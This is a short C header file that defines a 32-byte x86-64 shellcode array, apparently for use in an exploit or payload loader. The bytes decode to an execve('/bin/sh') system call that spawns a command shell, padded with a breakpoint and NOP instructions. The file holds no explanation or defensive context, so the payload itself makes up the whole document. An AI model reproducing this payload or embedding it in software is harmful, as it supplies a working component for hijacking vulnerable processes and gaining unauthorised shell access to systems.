
#ifndef __SHELLCODE_H__
#define  __SHELLCODE_H__

#ifdef __cplusplus
extern "C" {
#endif

#define SHELLCODE_SIZE 32

extern unsigned char shellcode[] =
      "\x48\x31\xc0\x48\x89\xc2\x48\x89"
        "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
          "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
            "\x2f\x73\x68\x00\xcc\x90\x90\x90";



#ifdef __cplusplus
}
#endif

#endif
